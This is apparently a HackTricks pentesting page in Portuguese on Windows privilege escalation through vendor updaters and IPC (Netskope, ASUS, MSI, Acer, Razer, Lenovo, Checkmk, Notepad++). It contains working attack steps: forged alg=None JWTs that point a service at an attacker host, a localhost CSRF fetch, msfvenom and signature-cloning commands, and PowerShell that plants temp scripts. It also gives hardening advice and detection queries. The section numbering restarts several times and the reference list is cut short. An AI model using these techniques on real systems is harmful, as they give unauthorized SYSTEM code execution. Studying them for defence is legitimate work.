# Abusando de atualizadores automáticos corporativos e IPC privilegiado (por exemplo, Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de escalação local de privilégios no Windows encontradas em agentes e atualizadores corporativos de endpoint que expõem uma superfície IPC de fácil acesso e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client para Windows < R129 (CVE-2025-0309), no qual um usuário com poucos privilégios pode forçar o processo de inscrição a usar um servidor controlado por um atacante e, em seguida, entregar um MSI malicioso que o serviço SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideias principais que você pode reutilizar contra produtos semelhantes:
- Abusar do IPC localhost de um serviço privilegiado para forçar uma nova inscrição ou reconfiguração para um servidor controlado por um atacante.
- Implementar os endpoints de atualização do fornecedor, entregar um Trusted Root CA malicioso e direcionar o atualizador para um pacote malicioso “assinado”.
- Evadir verificações fracas do signatário (listas de permissões de CN), sinalizadores opcionais de digest e propriedades de MSI permissivas.
- Se o IPC for “criptografado”, derivar a chave/IV de identificadores da máquina legíveis por todos e armazenados no registro.
- Se o serviço restringir os chamadores por caminho da imagem/nome do processo, injetar código em um processo permitido ou iniciar um processo suspenso e preparar sua DLL por meio de uma alteração mínima no contexto da thread.

Serviços TCP locais personalizados merecem a mesma análise de identidade e limites de entrada, mesmo quando exigem um PIN ou outra credencial da aplicação. Identifique o processo e a conta de serviço efetiva associados ao listener e, em seguida, examine o binário/versão exatos em uso e se os campos controlados pelo chamador são verificados quanto ao comprimento antes de serem copiados para buffers de tamanho fixo ou usados para construir o comando de um processo filho. [Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explica por que entradas externas não verificadas são perigosas em código nativo privilegiado. Um listener loopback, uma credencial hardcoded ou apenas um nome de processo não comprovam corrupção de memória nem execução como SYSTEM; a alcançabilidade, a autorização, o caminho de código e as mitigações continuam sendo condições distintas. Mantenha a enumeração de rotina passiva, em vez de enviar entradas com tamanho suficiente para causar falhas a um serviço em execução.

---
## 1) Forçando a inscrição em um servidor controlado por um atacante via IPC localhost

Muitos agentes incluem um processo de interface do usuário em modo usuário que se comunica com um serviço SYSTEM por TCP localhost usando JSON.

Observado no Netskope:
- UI: stAgentUI (integridade baixa) ↔ Serviço: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo do exploit:
1) Crie um token de inscrição JWT cujas claims controlam o host do backend (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja necessária.
2) Envie a mensagem IPC que invoca o comando de provisionamento com seu JWT e o nome do tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) O serviço começa a consultar seu servidor malicioso para obter dados de inscrição/configuração, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Observações:
- Se a verificação do solicitante for baseada no caminho/nome, origine a solicitação a partir de um binário do fornecedor na lista de permissões (consulte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Sequestrando o canal de atualização para executar código como SYSTEM

Quando o cliente se comunicar com seu servidor, implemente os endpoints esperados e direcione-o para um MSI controlado pelo atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retorne uma configuração JSON com um intervalo de atualização muito curto, por exemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Retorne um certificado CA PEM. O serviço o instala no repositório Trusted Root da máquina local.
3) /v2/checkupdate → Forneça metadados que apontem para um MSI malicioso e uma versão falsa.

Contornando verificações comuns observadas em ambientes reais:
- Allow-list do CN do signatário: o serviço pode verificar apenas se o Subject CN é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua CA maliciosa pode emitir um certificado leaf com esse CN e assinar o MSI.
- Propriedade CERT_DIGEST: inclua uma propriedade benigna de MSI chamada CERT_DIGEST. Não há validação durante a instalação.
- Validação opcional de digest: uma flag de configuração (por exemplo, check_msi_digest=false) desativa a validação criptográfica adicional.

Resultado: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lição sobre contornar patches: se um fornecedor responder adicionando uma pequena lista de domínios “confiáveis” em vez de autenticar criptograficamente a origem da atualização, procure redirecionadores ou proxies reversos pertencentes ao fornecedor que ainda permitam direcionar o tráfego. No caso da Netskope, pesquisas públicas posteriores mostraram que uma allow-list da era R129 ainda podia ser abusada por meio de `rproxy.goskope.com`, que fazia proxy de conteúdo do Azure App Service controlado pelo atacante. Trate allow-lists de nomes de host como um obstáculo, não como uma fronteira de confiança.<sup>[[14]](#references)</sup>

---
## 3) Forjando solicitações IPC criptografadas (quando presentes)

A partir da R127, a Netskope encapsulou o JSON IPC em um campo encryptData que parece ser Base64. A engenharia reversa revelou o uso de AES, com chave/IV derivados de valores do registro legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a criptografia e enviar comandos IPC criptografados válidos a partir de um usuário padrão.<sup>[[1]](#references)[[2]](#references)</sup> Dica geral: se um agente de repente “criptografar” seu IPC, procure IDs de dispositivo, GUIDs de produto e IDs de instalação no HKLM que possam ser usados como material.

---
## 4) Contornando allow-lists de chamadores IPC (verificações de caminho/nome)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o caminho/nome da imagem com binários do fornecedor em allow-lists, localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois métodos práticos para contornar isso:
- Injeção de DLL em um processo incluído na allow-list (por exemplo, nsdiag.exe) e encaminhamento do IPC de dentro dele.
- Inicie um binário incluído na allow-list em estado suspenso e inicialize sua proxy DLL sem CreateRemoteThread (consulte §5) para satisfazer as regras contra adulteração impostas pelo driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injeção compatível com proteção contra adulteração: processo suspenso + patch de NtContinue

Os produtos geralmente incluem um driver minifilter/callbacks OB (por exemplo, Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Processo: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader confiável em user mode que respeita essas restrições:
1) Crie um processo de um binário do fornecedor com CREATE_SUSPENDED.
2) Obtenha os handles que ainda são permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION para o processo e um handle de thread com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você aplicar o patch ao código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk inicial mapeado com garantia) com um pequeno stub que chama LoadLibraryW para o caminho da sua DLL e, em seguida, salta de volta.
4) Execute ResumeThread para acionar o stub no processo e carregar sua DLL.

Como você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já protegido (você o criou), a política do driver é respeitada.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Ferramentas práticas
- NachoVPN (plugin da Netskope) automatiza uma CA maliciosa, a assinatura de um MSI malicioso e disponibiliza os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope é um cliente IPC personalizado que cria mensagens IPC arbitrárias (opcionalmente criptografadas com AES) e inclui a injeção em processo suspenso para originar a solicitação de um binário incluído na allow-list.<sup>[[4]](#references)</sup>

## 7) Fluxo de triagem rápida para superfícies desconhecidas de updater/IPC

Ao analisar um novo agente de endpoint ou uma suíte auxiliar de placa-mãe, um fluxo de trabalho rápido geralmente basta para determinar se você está diante de um alvo promissor para privesc:<sup>[[6]](#references)</sup>

1) Enumere os listeners de loopback e identifique os processos do fornecedor correspondentes:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumere os named pipes candidatos:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraia dados de roteamento armazenados no registro usados por servidores IPC baseados em plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extraia primeiro os nomes dos endpoints, as chaves JSON e os IDs de comando do cliente em modo de usuário. Frontends Electron/.NET empacotados frequentemente fazem leak do schema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Procure o predicado de confiança real, não apenas o code path que acaba iniciando o processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Padrões que vale a pena priorizar:
- `CryptQueryObject`/análise de certificados sem `WinVerifyTrust` geralmente significa que “o certificado existe” foi tratado como “o certificado é confiável”, permitindo clonagem de certificados ou outros truques com signatários falsos.
- Verificações de substring/sufixo em `Origin`, `Referer`, URLs de download, nomes de processos ou CNs de signatários não são autenticação. `contains(".vendor.com")` geralmente é explorável com domínios semelhantes controlados por um atacante.
- Se a GUI com poucos privilégios decide que “o arquivo é confiável” e o broker SYSTEM apenas consome esse resultado, corrigir ou reimplementar a DLL/JS do lado do cliente geralmente contorna totalmente essa fronteira (validação dividida no estilo Razer).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois o valida ou agenda a partir desse caminho, teste imediatamente janelas de substituição TOCTOU e módulos de plugin irmãos que exponham wrappers alternativos de `ExecuteTask()` com verificações mais fracas.<sup>[[6]](#references)</sup>

Para alvos com muitas named pipes, o PipeViewer é uma maneira rápida de identificar DACLs fracas e pipes acessíveis remotamente antes de começar a fazer engenharia reversa do protocolo em profundidade.<sup>[[11]](#references)</sup>

Se o alvo autentica os chamadores apenas por PID, caminho da imagem ou nome do processo, trate isso como um obstáculo, não como uma barreira: injetar no cliente legítimo ou fazer a conexão a partir de um processo na lista de permissões costuma ser suficiente para satisfazer as verificações do servidor. Especificamente para named pipes, [esta página sobre impersonation de clientes e abuso de pipes](named-pipe-client-impersonation.md) aborda a primitiva com mais detalhes.

Para um **broker privilegiado de limpeza ou restauração**, inspecione também a fronteira de confiança do caminho, além da ACL do pipe. Um chamador com menos privilégios pode conseguir selecionar um destino de restauração ou renomear um artefato de backup preparado em um diretório compartilhado, mesmo quando o executável do serviço e seu diretório de instalação estão protegidos. Confirme separadamente que o chamador consegue acessar o comando de restauração, modificar a entrada preparada ou o nome de arquivo exato, que o broker é executado com uma identidade de nível superior e que a operação de restauração realmente grava no caminho protegido selecionado. Um diretório de preparação gravável ou um pipe legível, por si só, não comprova a possibilidade de escrita arbitrária privilegiada; o mapeamento do destino e o comportamento do serviço precisam ser revisados no código ou testados de forma controlada. Não invoque um comando de limpeza desconhecido durante a enumeração passiva, pois ele pode excluir arquivos do usuário.

---
## 8) Brokers modulares de add-ins autenticados apenas por assinaturas do fornecedor (padrão Lenovo Vantage)

Uma variação mais recente que vale a pena investigar é o **broker RPC de cliente assinado**: um processo de desktop Lenovo assinado, com poucos privilégios, comunica-se com um serviço SYSTEM, e o serviço encaminha comandos JSON para um conjunto de add-ins descritos em XML sob `%ProgramData%`. Assim que a execução de código é obtida **dentro de qualquer cliente assinado aceito**, cada contrato `runas="system"` passa a fazer parte da superfície de ataque.<sup>[[15]](#references)</sup>

Primitivas de alto valor observadas em pesquisas sobre o Lenovo Vantage:
- **Confiar no chamador por ser assinado pelo fornecedor**: pesquisadores alcançaram um contexto autenticado copiando um EXE assinado pela Lenovo para um diretório gravável e satisfazendo um DLL side-load (`profapi.dll`), permitindo que código arbitrário fosse executado dentro de um cliente que já era confiável para o serviço.
- **Descoberta da superfície de ataque orientada por manifestos**: os add-ins são declarados em `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; vários contratos são executados como `SYSTEM`, então enumerar esses manifestos costuma revelar os verbos privilegiados reais mais rapidamente do que fazer engenharia reversa do próprio broker.
- **Bugs por comando por trás do canal autenticado**: depois de entrar no cliente confiável, pesquisas públicas encontraram condições de path traversal + race em verbos de atualização/instalação, abuso de raw SQL em bancos de dados privilegiados de configurações e verificações de caminhos do registro baseadas em substring que permitiam gravações fora da hive pretendida.

Recon útil em um alvo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusão prática: sempre que um conjunto de ferramentas auxiliares expuser um broker que primeiro autentica o **processo chamador** e só então encaminha chamadas para dezenas de comandos de plugins/add-ins, não pare depois de contornar a verificação de confiança da entrada. Extraia a tabela de manifest/contratos e faça fuzzing de cada verbo de alto privilégio de forma independente; o canal autenticado geralmente oculta vários bugs de segundo estágio.

---
## 1) CSRF do navegador para localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

O DriverHub inclui um serviço HTTP em modo de usuário (ADU.exe) em 127.0.0.1:53000 que espera chamadas do navegador originadas de https://driverhub.asus.com. O filtro de origem simplesmente executa `string_contains(".asus.com")` no cabeçalho Origin e nas URLs de download expostas por `/asus/v1.0/*`. Portanto, qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, passa na verificação e pode enviar solicitações que alteram o estado usando JavaScript.<sup>[[6]](#references)</sup> Consulte [noções básicas de CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) para ver outros padrões de bypass.

Fluxo prático:
1) Registre um domínio que contenha `.asus.com` e hospede nele uma página maliciosa.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o corpo JSON esperado pelo handler — o JS compactado do frontend mostra o esquema abaixo.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Até mesmo a CLI do PowerShell mostrada abaixo tem sucesso quando o cabeçalho Origin é spoofado para o valor confiável:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualquer visita do navegador ao site do atacante se torna, portanto, um CSRF local de 1 clique (ou 0 cliques via `onload`) que aciona um helper SYSTEM.

---
## 2) Verificação insegura de assinatura de código e clonagem de certificado (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executáveis arbitrários definidos no corpo JSON e os armazena em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, o ADU.exe apenas verifica se o PE contém uma assinatura e se a string Subject corresponde à ASUS antes de executá-lo — sem `WinVerifyTrust` e sem validação da cadeia.

Para explorar esse fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone nele o signatário da ASUS (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio parecido com `.asus.com` e acione o UpdateApp via o CSRF do navegador acima.

Como os filtros de Origin e URL se baseiam em substrings e a verificação do signatário apenas compara strings, o DriverHub baixa e executa o binário do atacante em seu contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nos caminhos de cópia/execução do updater (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP em que cada frame tem o formato `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura via `CS_CommonAPI.EX_CA::Verify` (o Subject do certificado deve ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma tarefa agendada que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não é bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação da assinatura passe e que a tarefa seja enfileirada).
- Disputar uma condição de corrida com mensagens Frame B repetidas que apontam para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a conclusão da verificação.

Quando o agendador dispara, ele executa o payload sobrescrito como SYSTEM, apesar de ter validado o arquivo original. Uma exploração confiável usa duas goroutines/threads que enviam repetidamente CMD_AutoUpdateSDK até vencer a janela TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado em nível SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP do MSI Center
- Cada plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes direcionem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` **sem validação de assinatura** — qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução SYSTEM de forma determinística.
- Capturar o tráfego de loopback com Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento entre Component e comandos; clientes personalizados em Go/Python podem então reproduzir os frames.<sup>[[6]](#references)</sup>

### Named pipes do Acer Control Centre e níveis de impersonation
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua ACL discricionária permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um caminho de arquivo invoca a rotina do serviço que inicia processos.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os argumentos. A instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um SID de integridade antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) cai no branch genérico, que mantém o token SYSTEM completo e define um SID de alta integridade (`S-1-16-12288`). Portanto, o binário iniciado é executado como SYSTEM irrestrito, tanto localmente quanto entre máquinas.
- Combine isso com a flag de instalador exposta (`Setup.exe -nocheck`) para instalar o ACC até mesmo em VMs de laboratório e testar o pipe sem hardware do fornecedor.<sup>[[6]](#references)</sup>

Esses bugs de IPC destacam por que serviços localhost devem impor autenticação mútua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, filtragem de tokens) e por que o helper de cada módulo para “executar binário arbitrário” deve aplicar as mesmas verificações de signatário.

---
## 3) Helpers COM/IPC “elevator” protegidos por validação fraca em user mode (Razer Synapse 4)

O Razer Synapse 4 adicionou outro padrão útil a essa família: um usuário com poucos privilégios pode pedir a um helper COM que inicie um processo por meio de `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL em user mode (`simple_service.dll`), em vez de ser aplicada robustamente dentro do limite privilegiado.

Caminho de exploração observado:
- Instancie o objeto COM `RzUtility.Elevator`.
- Chame `LaunchProcessNoWait(<path>, "", 1)` para solicitar uma inicialização elevada.
- No PoC público, a verificação de assinatura do PE dentro de `simple_service.dll` é desativada com um patch antes de enviar a solicitação, permitindo iniciar um executável arbitrário escolhido pelo atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocação mínima em PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusão geral: ao fazer engenharia reversa de suítes “helper”, não se limite a TCP localhost ou named pipes. Verifique a existência de classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility` e, em seguida, confirme se o serviço privilegiado realmente valida o binário de destino ou apenas confia em um resultado calculado por uma DLL de cliente em modo de usuário que pode ser modificada. Esse padrão se aplica além da Razer: qualquer arquitetura dividida em que o broker de alto privilégio consome uma decisão de permitir/negar da parte de baixo privilégio é uma possível superfície de privesc.


---
## Execução previsível de script temporário durante o reparo do MSI (Checkmk Agent / CVE-2024-0670)

Alguns agentes do Windows ainda implementam ações privilegiadas gravando um `.cmd` temporário em `C:\Windows\Temp` e executando-o como `SYSTEM`. Se o nome do arquivo for previsível e o serviço não recriar os arquivos existentes de forma segura, um usuário com poucos privilégios pode criar previamente o futuro arquivo temporário como **somente leitura** e fazer o processo privilegiado executar conteúdo controlado pelo atacante em vez do próprio script.

Observado em builds vulneráveis do Checkmk Agent:
- padrão do arquivo temporário: `cmk_all_<PID>_1.cmd`
- versões afetadas: `2.0.0`, `2.1.0`, `2.2.0`
- gatilho: **reparo** do pacote do agente em cache do MSI<sup>[[8]](#references)[[9]](#references)</sup>

Fluxo de trabalho prático:
1. Estime um intervalo de PID realista com base nos IDs de processo atuais ou no PID do agente em execução.
2. Grave um payload `.cmd` curto em **ASCII** (`Set-Content -Encoding Ascii` ou redirecionamento do `cmd.exe`; evite a saída PowerShell em UTF-16 para arquivos batch).
3. Crie arquivos `C:\Windows\Temp\cmk_all_<PID>_1.cmd` em todo o intervalo candidato e marque cada arquivo como somente leitura.
4. Acione um reparo do MSI em cache para que o serviço privilegiado tente recriar o script temporário e, em seguida, o execute.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se o produto vulnerável estiver instalado com o Windows Installer, associe o MSI de nome aparentemente aleatório em cache em `C:\Windows\Installer` ao nome do produto antes de acionar o reparo:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operacionais:
- `qwinsta` é útil quando `msiexec /fa` falha em um shell WinRM não interativo e você precisa determinar se uma sessão de desktop existente ou desconectada pode acionar o reparo corretamente.<sup>[[7]](#references)</sup>
- Esse padrão se aplica também a outros agentes de endpoint e updaters que **armazenam scripts temporários em locais com permissão global de gravação e depois os executam como SYSTEM**. Teste nomes previsíveis, ausência de semântica de criação exclusiva e fluxos de reparo/atualização que possam ser acionados sob demanda.

### Reparo interativo do instalador e console privilegiado

O PDF24 Creator 11.15.1 ilustra outro risco de reparo de MSI: sua ação personalizada de instalação da impressora pode abrir um console visível com privilégios SYSTEM durante o reparo. O fornecedor alterou o instalador MSI na versão 11.15.2 para corrigir esse comportamento. Uma versão antiga do produto é apenas uma pista para triagem. Verifique o pacote MSI registrado ou acessível, se este usuário pode iniciar o reparo, se a ação personalizada vulnerável e o atraso no arquivo de log estão presentes e se um desktop interativo pode exibir o console. O atraso relatado usava um oplock em `faxPrnInst.log`; a simples possibilidade de gravar no arquivo não é a única condição de acesso. Um shell não interativo, um pacote inacessível ou um instalador corrigido podem interromper a cadeia. Esse problema não depende de `AlwaysInstallElevated` e difere da substituição de um script temporário previsível.

---
## Remote supply-chain hijack via validação fraca do updater (WinGUp / Notepad++)

Entre junho de 2025 e dezembro de 2025, invasores que comprometeram a infraestrutura de hospedagem por trás do fluxo de atualização do Notepad++ forneceram seletivamente manifestos maliciosos a vítimas escolhidas. Updaters mais antigos baseados em WinGUp não verificavam completamente a autenticidade das atualizações, então uma resposta XML hostil podia redirecionar os clientes para URLs controladas pelos invasores. Como o cliente aceitava conteúdo HTTPS sem exigir uma cadeia de certificados confiável e uma assinatura PE válida no instalador baixado, as vítimas baixavam e executavam um `update.exe` NSIS trojanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Fluxo operacional (não é necessário exploit local):
1. **Interceptação da infraestrutura**: comprometer o CDN/a hospedagem e responder às verificações de atualização com metadados do invasor que apontem para uma URL de download maliciosa.
2. **NSIS trojanizado**: o instalador baixa/executa um payload e abusa de duas cadeias de execução:
   - **Bring-your-own signed binary + sideload**: incluir o `BluetoothService.exe` assinado da Bitdefender e soltar uma `log.dll` maliciosa em seu caminho de pesquisa. Quando o binário assinado é executado, o Windows faz sideload da `log.dll`, que descriptografa e carrega reflexivamente o backdoor Chrysalis (protegido por Warbird + API hashing para dificultar a detecção estática).
   - **Injeção de shellcode por script**: o NSIS executa um script Lua compilado que usa APIs do Win32 (por exemplo, `EnumWindowStationsW`) para injetar shellcode e preparar o Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Recomendações de hardening/detecção para qualquer updater automático:
- Exija **verificação de certificado + assinatura** do instalador baixado (fixe o signatário do fornecedor e rejeite CN/cadeias incompatíveis) e assine o próprio manifesto de atualização (por exemplo, com XMLDSig). Bloqueie redirecionamentos controlados pelo manifesto, a menos que sejam validados.
- Trate o **BYO signed binary sideloading** como um ponto de detecção pós-download: gere alertas quando um EXE assinado de um fornecedor carregar uma DLL de fora do caminho canônico de instalação (por exemplo, a Bitdefender carregar `log.dll` de Temp/Downloads) e quando um updater soltar/executar instaladores em diretórios temporários com assinaturas que não sejam do fornecedor.
- Monitore **artefatos específicos do malware** observados nessa cadeia (úteis como pontos de investigação genéricos): mutex `Global\Jdhfv_1.0.1`, gravações anômalas de `gup.exe` em `%TEMP%` e etapas de injeção de shellcode acionadas por Lua.
- O Notepad++ respondeu reforçando o WinGUp na versão v8.8.9 e posteriores: o XML retornado agora é assinado (XMLDSig), e as versões mais recentes exigem verificação de certificado + assinatura do instalador baixado, em vez de confiar apenas no transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload de <code>log.dll</code> por EXE assinado pela Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não é do Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Esses padrões se aplicam a qualquer atualizador que aceite manifests não assinados ou não fixe os signatários do instalador — sequestro de rede + instalador malicioso + sideloading assinado com certificado próprio resultam em execução remota de código sob o pretexto de atualizações “confiáveis”.

---
## References
- [1] [Comunicado – Netskope Client para Windows – Escalonamento local de privilégios via servidor malicioso (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
